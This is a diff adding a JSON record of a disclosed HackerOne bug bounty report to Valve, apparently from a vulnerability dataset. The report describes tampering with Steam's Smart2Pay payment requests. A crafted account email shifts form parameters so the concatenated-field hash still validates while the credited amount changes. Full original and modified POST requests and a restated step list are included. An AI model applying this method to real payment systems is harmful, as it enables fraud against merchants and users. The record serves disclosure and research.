@@ -1,0 +1,50 @@
+{
+    "reported_to": "Valve",
+    "reported_by": "drbrix ",
+    "title": "Modify in-flight data to payment provider Smart2Pay",
+    "content": "\nI have found vulnerability which allows attacker to generate steam wallet balance.\nFirstly you will have to change yours steam account email to something like (I will explain why in next steps, amount100 is the important part):\nbrixamount100abc@\u2588\u2588\u2588\u2588\u2588\nThen go to https://store.steampowered.com/steamaccount/addfunds and click add add funds.\nProceed to payment and select any payment which uses Smart2Pay payment method (przelewy24 in my country).\nClick next steps as you would do with normal transaction.\nIntercept POST request to https://globalapi.smart2pay.com/\nYou should see request like that\nCode 1.08 KiB\n1POST / HTTP/1.1\n2Host: globalapi.smart2pay.com\n3Content-Length: 388\n4Cache-Control: max-age=0\n5Sec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\n6Sec-Ch-Ua-Mobile: ?0\n7Upgrade-Insecure-Requests: 1\n8Origin: https://store.steampowered.com\n9Content-Type: application/x-www-form-urlencoded\n10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\n11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n12Sec-Fetch-Site: cross-site\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-User: ?1\n15Sec-Fetch-Dest: document\n16Referer: https://store.steampowered.com/\n17Accept-Encoding: gzip, deflate\n18Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\n19Connection: close\n20\n21MerchantID=1102&MerchantTransactionID=\u2588\u2588\u2588&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F\u2588\u2588\u2588\u2588%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40\u2588\u2588\u2588\u2588\u2588\u2588\u2588&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=\u2588\u2588\u2588\nWe cant change parameters as there is Hash field with signature, however signature is generated like that hash(ALL_FIELDS_NAMES_VALUES_CONTACTED)\nFor this request it will look like that:\nhash(MerchantID1102MerchantTransactionID\u2588\u2588\u2588\u2588\u2588Amount2000.....)\nSo with our special email we can move parameters in a way that will change amount for us\nFor example, we can change original Amount=2000 to Amount2=000 and after contacting it still will be Amount2000\nThen we can change email from CustomerEmail=brixamount100abc%40\u2588\u2588\u2588\u2588 to CustomerEmail=brix&amount=100&ab=c%40\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 by this we are adding new field amount with our value.\nnew request should look like that:\nCode 1.09 KiB\n1POST / HTTP/1.1\n2Host: globalapi.smart2pay.com\n3Content-Length: 388\n4Cache-Control: max-age=0\n5Sec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\n6Sec-Ch-Ua-Mobile: ?0\n7Upgrade-Insecure-Requests: 1\n8Origin: https://store.steampowered.com\n9Content-Type: application/x-www-form-urlencoded\n10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\n11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n12Sec-Fetch-Site: cross-site\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-User: ?1\n15Sec-Fetch-Dest: document\n16Referer: https://store.steampowered.com/\n17Accept-Encoding: gzip, deflate\n18Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\n19Connection: close\n20\n21MerchantID=1102&MerchantTransactionID=\u2588\u2588\u2588\u2588\u2588\u2588&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F\u2588\u2588\u2588\u2588%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nThen just pay 1 $ and you should get your money on steam wallet in few hours/days those are some transactions made with this metod:\n2\u2588\u2588\u2588\u2588\u2588\u2588\u25883\n2\u2588\u2588\u2588\u25889\nand this is account i was testing everything on:\nhttp://steamcommunity.com/profiles/7656\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nI think impact is pretty obvious, attacker can generate money and break steam market, sell game keys for cheap etc.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 7500,
+    "weaknesses": [
+        "Business Logic Errors"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1628647500,
+    "report_url": "https://hackerone.com/reports/1295844",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Change your Steam account email to a specially crafted format (e.g., brixamount100abc@\u2588\u2588\u2588\u2588\u2588)"
+        ],
+        [
+            2,
+            "Navigate to https://store.steampowered.com/steamaccount/addfunds and proceed to payment using Smart2Pay"
+        ],
+        [
+            3,
+            "Intercept the POST request to https://globalapi.smart2pay.com/"
+        ],
+        [
+            4,
+            "Modify the request by altering the 'Amount' parameter and adding a new 'amount' field via the email parameter"
+        ],
+        [
+            5,
+            "Submit the modified request and complete the payment with a minimal amount"
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to manipulate in-flight payment data to Smart2Pay by crafting a specific email format and modifying the POST request parameters. This manipulation tricks the system into accepting a lower payment amount while crediting a higher amount to the Steam wallet.",
+    "reason": "The attack involves multiple steps including email manipulation, request interception, and parameter tampering. It requires understanding of how the payment provider processes and validates requests, particularly the hash generation mechanism. The subtle interaction between the email format and request parameters is non-obvious and requires precise manipulation to bypass the hash validation.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
